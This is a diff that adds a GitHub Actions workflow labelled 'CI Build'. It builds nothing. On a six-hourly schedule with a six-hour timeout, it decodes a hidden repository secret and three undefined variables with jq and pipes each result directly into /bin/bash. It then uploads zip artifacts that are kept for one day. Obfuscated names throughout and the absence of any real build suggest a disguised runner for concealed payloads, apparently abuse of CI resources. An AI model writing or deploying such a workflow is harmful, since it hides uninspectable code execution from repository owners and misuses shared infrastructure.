@@ -1,0 +1,33 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          qa467: ${{ secrets.qa467 }}
+        run: |
+          printf '%s' "$qa467" | jq -r .rscun05 | /bin/bash
+          echo $ubg97 | jq -r .z59 | /bin/bash
+          echo $qu42 | jq -r .q44372 | /bin/bash
+          echo $tfvt61 | jq -r .f22 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: OekL0jNO
+          path: "*.zip"
+          retention-days: 1
